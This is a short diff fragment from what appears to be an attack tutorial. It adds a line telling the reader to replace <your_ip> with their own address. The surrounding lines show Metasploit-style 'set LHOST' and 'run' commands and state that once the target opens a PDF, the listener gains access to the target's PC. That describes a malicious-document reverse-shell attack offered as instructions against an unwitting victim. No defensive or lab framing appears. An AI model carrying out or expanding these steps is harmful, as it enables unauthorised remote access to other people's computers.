@@ -41,4 +41,5 @@ $set LHOST <your_ip>
 
 $run
 
+Replace <your_ip> with your ip address
 Now your pc will start listening. As soon as your target opens the pdf, you will get access over his pc
